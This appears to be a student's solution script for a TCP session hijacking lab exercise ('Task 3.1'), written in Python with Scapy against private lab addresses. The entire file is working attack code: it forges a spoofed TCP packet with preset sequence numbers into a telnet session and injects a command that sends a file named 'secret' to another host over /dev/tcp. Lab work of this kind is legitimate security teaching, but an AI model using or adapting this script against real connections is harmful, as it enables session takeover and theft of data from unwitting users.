#!/usr/bin/env python3

# Task 3.1 ----------------------------------------------------
# Launching the attack manually

from scapy.all import *
from scapy.layers.inet import IP, TCP

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=47658, dport=23, flags="A", seq=4208369553, ack=2306133294)
data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, iface="br-5f9aa6b242e3", verbose=0)

